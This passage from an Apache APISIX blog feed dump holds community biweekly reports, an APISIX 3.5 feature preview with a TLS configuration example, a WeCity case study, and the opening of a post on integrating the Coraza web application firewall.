PqCRpcBRQe_0qvZaTiZY-knodxqyVdFQZL0fj2r19pSoXKSHVXsZKZeBmi14uy5QAjyAsyBGpACE4ny5HwkLrEQCi1YCdY2OvqBf8QC6r0KMe8PanIxtVwvLIQtwnBTMYjsusaYp0a4jfLLL_HOmy1K6eO0J41tb9hAY902DfILyxeV4MqLoYJcDxZ-gSCxLALObdKb2JPYNL9JLPMrrPj08eQStj41-b2gW1TYmON5GJDfGRISKNoSUIiQlhHbjQ1Q0aeuBbe3vfBIJZS_vns6WO_wjVii5svNJNgudftg09iKj63IHhLJIQbWhE7B6oNSnBccVrGWu73LH6TS9aGJao29THvHRjTYXTndQwEbybdAtfu7gSHcKTAh51cJlgtL0oxesYmAU9wcZqhD-MgA9ZK6lFdVvEt1gAa7qabGzNKWz7WxsTGNyunBvbgB6wHI-tLwbLTVxoHUmUjwiWaSKWhhl3FGnJ_8vrmexJtjYxl_Mf_v3cN0jxoJ3krBXcbQaBryY7ga1vsu-JbAPPYq4t3gOuDBGL4qQvJ6bU_OC1pMEkTpHVUtFxBN7zvuFjGRmTRvVojTDVbRkXSZNacMvQDsUhubSYLBYKKKE_FvESaQS_L6v1ozyiXNGu6iLHirDgwYZslO8vA10fQ3AZwMbT3g6aDEJc3Fg3AzdjN7SwFu9WLLtn_m00).\\n\\n## Conclusion\\n\\nIn this post, I described the structure of the `ctx` parameter in the `access()` function. While specific entries vary from configuration to configuration, it gives a good entry point into data manipulated by plugins.\\n\\nIt\'s also a good reminder that even if you\'re not fluent in a language or a codebase, you can get quite a lot of information by logging some variables.\\n\\n**To go further:**\\n\\n* [ctx parameter](https://apisix.apache.org/docs/apisix/plugin-develop/#ctx-parameter)"},{"id":"Biweekly Report (September 11 - September 24)","metadata":{"permalink":"/blog/2023/09/26/bi-weekly-report","source":"@site/blog/2023/09/26/bi-weekly-report.md","title":"Biweekly Report (September 11 - September 24)","description":"The Apache APISIX Community Biweekly Report helps community members understand how the Apache APISIX community is progressing, making it easier for everyone to get involved.","date":"2023-09-26T00:00:00.000Z","formattedDate":"September 26, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.955,"truncated":true,"authors":[],"prevItem":{"title":"Down the rabbit hole of an Apache APISIX plugin","permalink":"/blog/2023/09/28/rabbit-hole-apisix-plugin"},"nextItem":{"title":"Discover What\'s Next: APISIX 3.5 Preview","permalink":"/blog/2023/09/20/apisix-3.5-preview"}},"content":"> We have recently made some fixes and improvements to specific features within Apache APISIX. These changes involve utilizing `xrpc` to support the dubbo protocol, enabling the recording of OpenTelemetry variables in the `access_log`, and allowing modification of request bodies in external plugins. For additional information, please consult the biweekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has developed into a thriving community since its open-source debut, becoming the world\'s most active open-source API gateway project thanks to the collaborative efforts of our community partners.\\n\\nFrom 9.11 to 9.24, a total of 23 contributors made 43 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently addressed and enhanced various features, and here is a summary of the updates:\\n\\n1. Utilize `xrpc` to support the dubbo protocol\\n\\n2. Enable the recording of OpenTelemetry variables in the `access_log`\\n\\n3. Allow modification of request bodies in external plugins\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report helps community members understand how the Apache APISIX community is progressing, making it easier for everyone to get involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/09/26/vv9C03oJ_Frame%204.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/09/26/0xnTsOLT_9.24-newcon.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Utilize `xrpc` to support the Dubbo protocol](https://github.com/apache/apisix/pull/9660) (Contributor: [wxbty](https://github.com/wxbty))\\n\\n- [Enable the recording of OpenTelemetry variables in the `access_log`](https://github.com/apache/apisix/pull/8871) (Contributor: [lework](https://github.com/lework))\\n\\n- [Allow modification of request bodies in external plugins](https://github.com/apache/apisix/pull/9990) (Contributor: [jiangfucheng](https://github.com/jiangfucheng), [rubikplanet](https://github.com/rubikplanet))\\n\\n## Recent Blog Recommendations\\n\\n- [Charting the Future of Urban Connectivity: WeCity Collaborates with APISIX](https://apisix.apache.org/blog/2023/09/20/wecity-uses-apisix/)\\n\\n  WeCity has been using APISIX for its core business since May 2023. Arjen Hof, Co-founder and CTO of WeCity, and Tim van Densen, Software Architect and Lead Developer of WeCity, shared their experience with APISIX.\\n\\n- [Coraza: Elevating APISIX with Cutting-Edge WAF Features](https://apisix.apache.org/blog/2023/09/08/APISIX-integrates-with-Coraza/)\\n\\n  The integration of APISIX and Coraza provides reliable security protection and ensures the integrity and reliability of API services.\\n\\n- [Release Apache APISIX 3.5.0](https://apisix.apache.org/blog/2023/09/01/release-apache-apisix-3.5.0/)\\n\\n  We are pleased to present Apache APISIX 3.5.0 with exciting new features and improvements to user experiences.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Discover What\'s Next: APISIX 3.5 Preview","metadata":{"permalink":"/blog/2023/09/20/apisix-3.5-preview","source":"@site/blog/2023/09/20/apisix-3.5-preview.md","title":"Discover What\'s Next: APISIX 3.5 Preview","description":"APISIX 3.5 introduces a series of exciting new features that will bring users a higher level of security, performance, and scalability.","date":"2023-09-20T00:00:00.000Z","formattedDate":"September 20, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":10.1,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://github.com/moonming","image_url":"https://avatars.githubusercontent.com/u/26448043?v=4","imageURL":"https://avatars.githubusercontent.com/u/26448043?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (September 11 - September 24)","permalink":"/blog/2023/09/26/bi-weekly-report"},"nextItem":{"title":"Charting the Future of Urban Connectivity: WeCity Collaborates with APISIX","permalink":"/blog/2023/09/20/wecity-uses-apisix"}},"content":"> APISIX 3.5 introduces a series of exciting new features that will bring users a higher level of security, performance, and scalability, thereby providing users with more choices and making it more convenient and flexible when building and managing APIs.\\n\x3c!--truncate--\x3e\\n\\n## Introduction to APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance open-source API gateway that provides rich traffic management functions such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, and observability. Being built based on NGINX and LuaJIT, Apache APISIX has ultra-high performance with a single-core QPS of up to 23,000 and an average delay of only 0.2 milliseconds. It can solve problems in traditional architecture, and at the same time adapt to the needs of the cloud-native era.\\n\\n[APISIX](https://github.com/apache/apisix) has an active community and a rich ecosystem, with nearly 100 open-source plugins covering scenarios such as network security, performance optimization, load balancing, monitoring, and traffic management. This provides users with a powerful and flexible API gateway solution. Apache APISIX is now the most active API gateway project on GitHub addressing 1 Trillion+ API calls per day, which is still growing.\\n\\n![APISIX Architecture](https://static.apiseven.com/uploads/2023/09/21/kJDnBMVX_APISIX%20Architecture.png)\\n\\nAPISIX solves two major [pain points of NGINX](https://apisix.apache.org/blog/2022/07/30/why-we-need-apache-apisix/).\\n\\n- First, NGINX does not support cluster management. Almost every internet manufacturer has its own NGINX configuration management system. These systems have many similarities but there is no unified solution.\\n\\n- The second is that NGINX does not support hot reloading of configurations. If a company modifies the configuration of NGINX, it can take more than half an hour to reload NGINX. And under the Kubernetes system, upstream will change frequently. If NGINX is used, the service needs to be restarted frequently, which is unacceptable for enterprises.\\n\\nAPISIX supports cluster management and dynamic loading, providing the advantages of high reliability, elastic scaling, flexibility, and seamless updates.\\n\\nBeing the API Gateway with the highest market share in the Asia-Pacific region, Apache APISIX has a wide range of application scenarios. It can be applied to scenarios such as gateways, Kubernetes Ingress, and service mesh, and can help enterprises quickly and safely process API and microservice traffic. At present, it has been tested and highly recognized by worldwide enterprises and organizations such as Amber Group, [Airwallex](https://apisix.apache.org/blog/2021/11/03/airwallex-usercase/), Lotus Cars, [Lenovo](https://apisix.apache.org/blog/2023/06/02/lenovo-uses-apisix/), vivo, and [WPS](https://apisix.apache.org/blog/2021/09/28/wps-usercase/).\\n\\n## New features in APISIX 3.5\\n\\n### Host-level TLS protocol configuration\\n\\nThis feature refers to configuring the version that supports TLS on the client side by specifying the global version through YAML in the NGINX-specified file. For example, all APIs only support TLS 1.2 and TLS 1.3, but some old clients need to support the earlier version of TLS 1.1. These configurations can take effect at the same time.\\n\\n**Key features and benefits:**\\n\\n1. Global TLS version configuration: Easily configure global settings for TLS versions on the client side by using YAML in an NGINX specification file.\\n\\n2. Compatibility with older clients: By configuring and merging different TLS versions simultaneously, while ensuring that clients support the older TLS 1.1 version, smooth and continuous communication can be guaranteed.\\n\\n3. Fine-grained control: APISIX uses OpenResty to dynamically specify different TLS protocols for each host. This granular control enables optimal security and flexibility in TLS configuration based on the unique needs of each API host.\\n\\n```yaml\\napisix:\\n  ssl:\\n    ssl_protocols: TLSv1.2 TLSv1.3\\n```\\n\\n```json5\\n// curl http://127.0.0.1:9180/admin/apisix/ssls/1\\n{\\n    \\"cert\\": \\"$cert\\",\\n    \\"key\\": \\"$key\\",\\n    \\"snis\\": [\\"test.com\\"],\\n    \\"ssl_protocols\\": [\\n        \\"TLSv1.2\\",\\n        \\"TLSv1.3\\"\\n    ]\\n}\\n```\\n\\n### Wasm & Coraza WAF\\n\\nAmong the series of new features launched by APISIX, it is commendable that APISIX integrates the `coraza-proxy-wasm` plugin. APISIX provides robust support for the development of plugins using WebAssembly (Wasm), while Coraza offers a diverse range of Wasm plugins to choose from. As a result, the integration of Coraza with APISIX entails a relatively low cost. The cross-platform nature of Wasm allows APISIX and Coraza to work together seamlessly, eliminating the need for large-scale code modification and adaptation.\\n\\n**Key features and benefits:**\\n\\n1. Powerful security: The `coraza-proxy-wasm` is a Wasm-based web application firewall (WAF) plugin that can detect and block common web attacks such as SQL injection and cross-site scripting (XSS),  Cross-site request forgery (CSRF), etc. by analyzing and monitoring HTTP and HTTPS traffic in real-time.\\n\\n2. Flexibility and scalability: You have the flexibility to configure and manage WAF rules, which can be customized to your specific application needs. It supports custom rules and policies, which can be configured according to specific security needs, and can also be integrated with other security tools and systems to provide a more comprehensive security solution.\\n\\nAPISIX can be used for more applications on Wasm, but asynchronous calls are not currently supported. A version that supports asynchronous calls in Wasm is expected to be launched in early October. Later, you can also use mainstream languages \u200b\u200bsuch as Rust or Golang to completely develop APISIX plugins.\\n\\n### HTTP/3 & QUIC\\n\\nAPISIX\'s support for HTTP/3 and QUIC protocols can bring faster transfer speeds, better network performance, and higher connection efficiency. This will help improve the performance and user experience of the application and enable it to adapt to the evolving network environment.\\n\\nAPISIX maintains its own version of NGINX, `apisix-base`, and applies HTTP/3 and QUIC patches to it, forming its own release.\\n\\nBecause APISIX is built on top of NGINX and OpenResty, enabling this feature requires updating its ecosystem, particularly the upstream dependencies of NGINX and OpenResty. Currently, APISIX is awaiting the master version of OpenResty to be upgraded to NGINX 1.25 or above, after which certain patches and interfaces of APISIX will be updated. It is expected to be implemented in October.\\n\\n**Key features and benefits:**\\n\\n1. Faster transfer speeds: HTTP/3 and QUIC use optimized transfer mechanisms, including multiplexing, 0-RTT connection establishment, and better congestion control. These technologies can significantly increase the speed of data transfer and reduce latency, thereby providing faster response times and higher throughput.\\n\\n2. Better network performance: HTTP/3 and QUIC bypass some of the limitations and performance bottlenecks of TCP by using the UDP protocol as the transport layer protocol. The UDP protocol performs better in unreliable network environments and can better adapt to network jitter and packet loss, thereby providing a more stable and reliable network connection.\\n\\n3. Higher connection efficiency: HTTP/3 and QUIC adopt a 0-RTT connection establishment mechanism to establish a faster initial connection between the client and the server. This means that the round-trip delay can be reduced when establishing a connection with the server, the request-response cycle can be accelerated, and the user experience can be improved.\\n\\n## APISIX Roadmap\\n\\n### GitOps\\n\\nAPISIX is a cloud-native API gateway that enables better integration with cloud-native systems. Although APISIX configuration can be written using YAML, APISIX lacks complete integration with related ecosystems such as CICD, including Jenkins, ArgoCD, etc. The APISIX Ingress Controller project has better integration in this area, but APISIX itself does not provide a complete set of declarative tools to support GitOps when used in non-Kubernetes environments such as bare metal or virtual machines.\\nOver the next month, APISIX will focus on solving this problem. APISIX\'s declarative tool ADC can help users perform various integrations in non-Kubernetes environments in a declarative manner. After this, users can connect well with tools such as Jenkins and ArgoCD in non-Kubernetes environments, and use the internal CICD method of GitOps to control APISIX to achieve functions such as multi-environment release.\\n\\n### OpenAPI\\n\\nWhen we talk about API gateway, we are discussing more than just the API gateway itself. API gateway is only one part of the full lifecycle management of API. API lifecycle management covers API design, API documentation, testing, gateways, and monetization. The chain consists of multiple interconnected components, with the API gateway serving as a pivotal element. In order to establish seamless connectivity among these components, it is imperative to establish standardized interfaces or protocols between different systems. Open API assumes a paramount role in facilitating this integration process.\\n\\nThere are several versions of Open API, with the current mainstream options being OpenAPI 2.0 (commonly known as Swagger) and OpenAPI 3.0. APISIX\'s significant objective is to provide comprehensive support for various API definition methods, including Swagger, OpenAPI 3.0, and Postman Collection. We will enable the authoring of API definitions using YAML, a protocol format akin to OpenAPI. Once APISIX completes its GitOps support, users will have the convenience of effortlessly importing APIs defined in tools like Postman into the APISIX gateway. Additionally, they can export APIs defined within APISIX to tools such as Postman, facilitating seamless integration.\\n\\n### Refactor plugin runner\\n\\nAPISIX supports multiple programming languages for developing plugins, including Lua, Wasm, etc. However, APISIX has encountered some challenges in Wasm development, particularly in the area of plugin runners. Currently, communication between the plugin runner and APISIX is conducted via a custom RPC protocol. However, relying solely on the demo is insufficient if users need to read request bodies or modify response content. Furthermore, when users deploy the demo in a production environment, custom RPC introduces significant retrofitting costs as users would need to modify the RPC protocol. Moreover, custom RPC can\'t provide robust support for various language libraries in the future.\\n\\n![APISIX plugin runner](https://static.apiseven.com/uploads/2023/09/22/QOQToIY9_9269cb5f-41dd-4f3f-bff1-a5f0c3b01bdc.jpeg)\\n\\nTherefore, in the new design of the plugin runner, the RPC invocation method is abandoned in favor of standard HTTP calls. In the context of HTTP calls, it can be likened to the function-based serverless approach offered by cloud service providers. Within APISIX, remote functions will be invoked through HTTP calls, abstracting away the underlying implementation language. This approach eliminates the need for a custom RPC protocol.\\n\\nNext month, we will release a new demo that, while it may incur some performance trade-offs, will significantly enhance user scalability and flexibility. Users no longer need to be familiar with custom protocols but instead can operate using functions, getting greater flexibility in making choices. Users can choose Lua for more robust performance and the overall integrity of APISIX. If users find Lua is complex in maintenance, they can opt for Wasm. Alternatively, if users have less stringent performance requirements, they can utilize the function call.\\n\\n### Refactor documentation\\n\\nIn the APISIX community, there are frequent complaints about the low quality of [documentation](https://apisix.apache.org/docs/). The lack of professionalism and numerous issues or omissions in APISIX documentation can be attributed to its nature as a community-driven project with approximately 600 contributors, half code contributors, and the other half documentation contributors. These hundreds of individuals from diverse backgrounds write the documentation in their unique ways, resulting in inconsistent quality of the content. To address this, we have planned a comprehensive overhaul of the entire documentation to ensure its quality.\\n\\nWe will allocate six months to reconstruct APISIX documentation, which will consist of six sections. Firstly, there will be a \\"Getting Started\\" section that will allow users to quickly understand and run APISIX within a few minutes. Following that, the \\"How to Guide\\" section will introduce common use cases for APISIX. Next, there will be a section providing background information, and explaining concepts such as the definitions of route and service. Additionally, we will provide best practices that offer detailed insights into the usage of APISIX in production environments. Another focal point will be the comprehensive introduction of approximately 100 plugins. Lastly, there will be a reference section.\\n\\n## Summary\\n\\nAs a leading API gateway, APISIX actively integrates with more ecosystems to enrich its own functionality and enhance the user experience.\\n\\nThe host-level TLS protocol configuration allows users to customize TLS settings at different host levels, providing higher security and customization. APISIX supports Wasm and Coraza WAF, enabling users to write high-performance plugins using Wasm to further enhance APISIX\'s capabilities. Coraza WAF, on the other hand, is a powerful web application firewall that enhances APISIX\'s security protection. Additionally, APISIX will also support HTTP/3 and QUIC, the next-generation network protocols known for their faster transmission speed and improved performance, offering users a smoother experience.\\n\\nFurthermore, APISIX has unveiled its roadmap, including GitOps, OpenAPI, and refactoring of the plugin runner and documentation. These exciting new features and blueprints of APISIX will bring users a higher level of security, performance, and scalability, providing them with more choices and making API building and management more convenient and flexible."},{"id":"Charting the Future of Urban Connectivity: WeCity Collaborates with APISIX","metadata":{"permalink":"/blog/2023/09/20/wecity-uses-apisix","source":"@site/blog/2023/09/20/wecity-uses-apisix.md","title":"Charting the Future of Urban Connectivity: WeCity Collaborates with APISIX","description":"WeCity has been using APISIX for its core business since May 2023. Arjen Hof, Co-founder and CTO of WeCity, and Tim van Densen, Software Architect and Lead Developer of WeCity, shared their experience with APISIX.","date":"2023-09-20T00:00:00.000Z","formattedDate":"September 20, 2023","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":6.27,"truncated":true,"authors":[{"name":"Arjen Hof","title":"Author"},{"name":"Tim van Densen","title":"Author"}],"prevItem":{"title":"Discover What\'s Next: APISIX 3.5 Preview","permalink":"/blog/2023/09/20/apisix-3.5-preview"},"nextItem":{"title":"Biweekly Report (August 28 - September 10)","permalink":"/blog/2023/09/13/biweekly-report"}},"content":"> WeCity has been using APISIX for its core business since May 2023. Arjen Hof, Co-founder and CTO of WeCity, and Tim van Densen, Software Architect and Lead Developer of WeCity, shared their experience with APISIX.\\n\x3c!--truncate--\x3e\\n\\n## About WeCity\\n\\n[WeCity](https://www.wecity.nl/en), a Dutch company, serves as the vital link between smart city solution providers and their users. By offering an array of technical and organizational tools, WeCity facilitates secure and reliable data exchange.\\n\\nCurrently, WeCity is actively engaged in a significant initiative led by the Dutch Ministry of Infrastructure. As part of this endeavor, WeCity has been entrusted with the development of generic services for an inventive data-driven mobility ecosystem. Within this ecosystem, our company ensures that both the supply and demand sides receive robust support while adhering to agreements that foster a dependable and trustworthy data exchange.\\n\\nWe would be thrilled to share our exceptional experience with [APISIX](https://apisix.apache.org/), providing hints for any enterprise looking for a cutting-edge API gateway solution that can take their applications to new heights.\\n\\n## Q: Could you please use one sentence to summarize your feelings about APISIX?\\n\\nA: We value APISIX for its open-source character, the philosophy behind it, its core feature focus, and response communication.\\n\\n## Q: What are the biggest challenges on the horizon for your industry?\\n\\nA: As mentioned, there are many different data sources regarding public space, coming from a plethora of different organizations. Making this data available in a secure, trusted way is critical. Our objective is to establish a federated network comprising data owners, platforms, providers, and consumers. The challenge is to create a governance structure that makes processes auditable, traceable, transparent, and secure.\\n\\n## Q: What was your team\'s process before using APISIX?\\n\\nA: Our goal is to enable a secure exchange of data, with full control for the data owner and options to monetize data. We have looked into many different (open-source) API management solutions. They all have pros and cons, but none of the solutions fit our architecture because they required too many modifications and were not extensible with plugins.\\n\\n## Q: What were the major pain points of your process before using APISIX?\\n\\nA: WeCity focused on public space and was building a data market to offer data owners the opportunity to expose their datasets to data consumers. The data owner should be able to attach plans and policies to their data. If necessary, data transformations can also be applied to standardize data according to international standards.\\n\\nHowever, the exchange and exposure of data was cumbersome, leaving data owners with limited control. Existing solutions were often custom-made and hard to maintain. The cost associated with these processes can be substantial, while opportunities to monetize valuable data remain limited.\\n\\nIn addition, there were many datasets available related to public space: mobility, housing, green and nature, logistics, waste management, and more. Facilitating the secure and standardized availability of this data while ensuring complete control for the data owner presented a formidable challenge.\\n\\nData management requires multiple components, from metadata management, streaming services, data models, IAM (Identity and Access Management), metrics, monitoring, and many more. Integrating these components requires an open, flexible, and extensible architecture.\\n\\nBefore using APISIX, we had to define a specific approach for every partner we wanted to connect with. With APISIX we are able to apply plans and policies to different datasets and integrate them into our architecture.\\n\\n## Q: Were you comparing alternative solutions? Why us? Pros and cons? How long have you been using APISIX?\\n\\nA: We thoroughly evaluated various solutions, including WSO2, Kong, Gravitee, 3Scale, API Umbrella, etc. We found that many open-source options were functionally restricted, necessitating costly enterprise agreements or support contracts for additional assistance. It was imperative for us to find a solution that seamlessly integrated into our existing architecture and infrastructure, as we anticipated the need to handle diverse data types, delivery mechanisms, and security requirements.\\n\\nBesides, we prefer to use open-source software in our architecture. Therefore, we followed projects the [Apache Software Foundation](https://www.apache.org/) offers and researched several other open-source API management solutions. We found APISIX on Apache and found that it is one of the truly open solutions, with an approach that aligns with our goals.\\n\\nAfter careful consideration, we made the decision to adopt APISIX in May 2023.\\n\\n## Q: Would you share some details about how your team implemented APISIX?\\n\\nA: Our full infrastructure is running on Kubernetes. That is why we were pleased to see APISIX is supporting a native Kubernetes solution. We are making use of the APISIX Kubernetes Ingress Controller, which we have set up through the official APISIX Helm chart. The broad technical support of APISIX is also one of the reasons why we chose it.\\n\\n## Q: How do you and your team currently use APISIX? What types of goals or tasks are you using APISIX to accomplish?\\n\\nA: We are currently using APISIX as a gateway for managing our routes and consumers. For each route, it is very easy to customize the behavior through plugins. Because we receive many requests for API access from different kinds of partners and customers we have to be flexible. For example, it is very easy to set up a new route for an existing backend API which requires different rate limiting. With a few changes in the plugin confirmation, a new route is generated quickly.\\n\\nWe are creating these routes with the native ApisixRoute in Kubernetes and also making use of the APISIX admin API. Our customers can control their own subscription, when a subscription has been activated a route is dynamically created with a different authentication config for each customer.\\n\\n## Q: Were there any internal risks or additional costs involved with implementing APISIX? If so, how did you address them?\\n\\nA: The risk is that we will have to cope with data processes that are not completely known yet. We have tested different scenarios and have not found limitations yet. Also, the implementation of APISIX was rather straightforward and did not raise additional costs. When the number of data sources grows in the data market, we will need additional resources but this is part of the business plan.\\n\\n## Q: What was the most obvious advantage you felt about APISIX?\\n\\nA: Open source, extensible, and implementation.\\n\\n## Q: By using APISIX, can you measure any improvements in productivity or time savings?\\n\\nA: It will be easier for us to add new data sources to our data market and we build upon our knowledge to create plans and policies, monitor usage, and monetize subscriptions.\\n\\n## Q: How would you describe APISIX if you explained it to a friend?\\n\\nA: APISIX is a component manager that enables us to apply plans and policies to data sources and expose them in a secure way to consumers.\\n\\n## Summary\\n\\nBy leveraging APISIX, WeCity securely and standardizes data availability while maintaining full control for the data owner. This enables us to apply specific plans and policies to different datasets, seamlessly integrating them into their existing architecture. The adaptability provided by APISIX greatly enhances our overall data management capabilities.\\n\\nFurthermore, the introduction of APISIX streamlines the data exposure and exchange process, improving efficiency and scalability. WeCity can effortlessly handle larger volumes of data, ensuring smooth operations and facilitating future growth.\\n\\nThe use of APISIX establishes a robust framework for data sharing, ensuring the reliability and trustworthiness of exchanged data. This is crucial for building a sustainable and efficient mobility ecosystem that meets the needs of service providers and users."},{"id":"Biweekly Report (August 28 - September 10)","metadata":{"permalink":"/blog/2023/09/13/biweekly-report","source":"@site/blog/2023/09/13/biweekly-report.md","title":"Biweekly Report (August 28 - September 10)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-09-13T00:00:00.000Z","formattedDate":"September 13, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.04,"truncated":true,"authors":[],"prevItem":{"title":"Charting the Future of Urban Connectivity: WeCity Collaborates with APISIX","permalink":"/blog/2023/09/20/wecity-uses-apisix"},"nextItem":{"title":"Coraza: Elevating APISIX with Cutting-Edge WAF Features","permalink":"/blog/2023/09/08/APISIX-integrates-with-Coraza"}},"content":"> We have recently made fixes and improvements to certain features of Apache APISIX and APISIX Ingress Controller. These include providing native JSON data structure input support for the wasm plugin, adding UNIX socket listening support for the `chaitin-waf` plugin, and introducing the ability to remove the etcd dependency required by APISIX within the APISIX Ingress to reduce architectural complexity. For more details, please refer to the biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 8.28 to 9.10, 16 contributors submitted 47 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. Provide native JSON data structure input support for the wasm plugin\\n\\n2. Add UNIX socket listening support for the `chaitin-waf` plugin\\n\\n3. Introduce the ability to remove the etcd dependency required by APISIX within the APISIX Ingress to reduce architectural complexity (Experimental Feature)\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/09/26/afJdz8VA_Group%204.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/09/26/KLSzp6dh_0910.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Provides native JSON data structure input support for the wasm plugin](https://github.com/apache/apisix/pull/10072) (Contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n- [Add UNIX socket listening support for the `chaitin-waf` plugin](https://github.com/apache/apisix/pull/10161) (Contributor: [zclaiqcc](https://github.com/zclaiqcc))\\n\\n### APISIX Ingress Controller\\n\\n- [Introduce the ability to remove the etcd dependency required by APISIX within the APISIX Ingress to reduce architectural complexity](https://github.com/apache/apisix-ingress-controller/pull/1803) (Contributor: [AlinsRan](https://github.com/AlinsRan))\\n\\n## Recent Blog Recommendations\\n\\n- [Coraza: Elevating APISIX with Cutting-Edge WAF Features](https://apisix.apache.org/blog/2023/09/08/APISIX-integrates-with-Coraza/)\\n  \\n  The integration of APISIX and Coraza provides reliable security protection and ensures the integrity and reliability of API services.\\n  \\n- [Release Apache APISIX 3.5.0](https://apisix.apache.org/blog/2023/09/01/release-apache-apisix-3.5.0/)\\n\\n  We are pleased to present Apache APISIX 3.5.0 with exciting new features and improvements to user experiences.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Coraza: Elevating APISIX with Cutting-Edge WAF Features","metadata":{"permalink":"/blog/2023/09/08/APISIX-integrates-with-Coraza","source":"@site/blog/2023/09/08/APISIX-integrates-with-Coraza.md","title":"Coraza: Elevating APISIX with Cutting-Edge WAF Features","description":"The integration of APISIX and Coraza provides reliable security protection and ensures the integrity and reliability of API services.","date":"2023-09-08T00:00:00.000Z","formattedDate":"September 8, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":6.77,"truncated":true,"authors":[{"name":"Guohao Wang","title":"Author","url":"https://github.com/sn0rt","image_url":"https://avatars.githubusercontent.com/u/2706161?v=4","imageURL":"https://avatars.githubusercontent.com/u/2706161?v=4"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://avatars.githubusercontent.com/u/114121331?v=4","imageURL":"https://avatars.githubusercontent.com/u/114121331?v=4"}],"prevItem":{"title":"Biweekly Report (August 28 - September 10)","permalink":"/blog/2023/09/13/biweekly-report"},"nextItem":{"title":"Release Apache APISIX 3.5.0","permalink":"/blog/2023/09/01/release-apache-apisix-3.5.0"}},"content":"> The integration of APISIX and Coraza provides reliable security protection and ensures the integrity and reliability of API services.\\n\x3c!--truncate--\x3e\\n\\nWith the rapid advancement of cloud-native technology, securing APIs has become increasingly crucial. In response to this growing need, [Apache APISIX](https://github.com/apache/apisix) has introduced a range of cutting-edge features. Among them, it is commendable that APISIX has integrated the [coraza-proxy-wasm](https://github.com/corazawaf/coraza-proxy-wasm) plugin. We will delve into APISIX\'s enhanced WAF capabilities and explore how Coraza can fortify applications against a wide array of web attacks, ensuring comprehensive security.\\n\\n## Apache APISIX\\n\\n[Apache APISIX](https://apisix.apache.org/) is a dynamic, real-time, high-performance open-source API gateway that provides rich traffic management functions such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, and observability. Being built based on NGINX and LuaJIT, Apache APISIX has ultra-high performance with a single-core QPS of up to 23,000 and an average delay of only 0.2 milliseconds. It can solve problems in traditional architecture, and at the same time adapt to the needs of the cloud-native era.\\n\\nAs an API gateway, Apache APISIX has a wide range of application scenarios. It can be applied to scenarios such as gateways, Kubernetes Ingress, and service mesh, and can help enterprises quickly and safely process API and microservice traffic. At present, it has been tested and highly recognized by worldwide enterprises and organizations such as Amber Group, [Airwallex](https://apisix.apache.org/blog/2021/11/03/airwallex-usercase/), Lotus Cars, vivo, and European Factory Platform.\\n\\n## Coraza\\n\\n[WAF](https://en.wikipedia.org/wiki/Web_application_firewall), or Web Application Firewall, is a network security tool designed to safeguard web applications against various cyberattacks by filtering and monitoring HTTP communications between web applications and the internet.\\n\\n[Coraza](https://coraza.io/) is a highly renowned open-source WAF implementation. Integrating Coraza with APISIX significantly enhances APISIX\'s ability to protect upstream services.\\n\\n**It provides specific advantages in the following areas:**\\n\\n1. Attack Detection and Prevention: Coraza, through real-time analysis and monitoring of HTTP and HTTPS traffic, can detect and prevent common web attacks such as SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and more.\\n\\n2. Logging and Reporting Capabilities: Coraza offers advanced logging and reporting features, allowing administrators to track and analyze security events within the system. This aids in promptly identifying potential threats and taking appropriate measures to address security issues.\\n\\n3. Flexibility and Scalability: It provides flexible configuration options, allowing administrators to customize according to specific application needs. It supports custom rules and policies, which can be configured based on specific security requirements. Additionally, it can integrate with other security tools and systems, providing a more comprehensive security solution.\\n\\n## Why APISIX Prefers Coraza-WAF?\\n\\n### Open-Source Community\\n\\nWhen selecting a new WAF solution, APISIX places significant importance on its support for the open-source community. Similar to APISIX, Coraza has an active developer community. The support of the open-source community enables Coraza to provide timely updates and support. Community members actively participate in the development and maintenance of 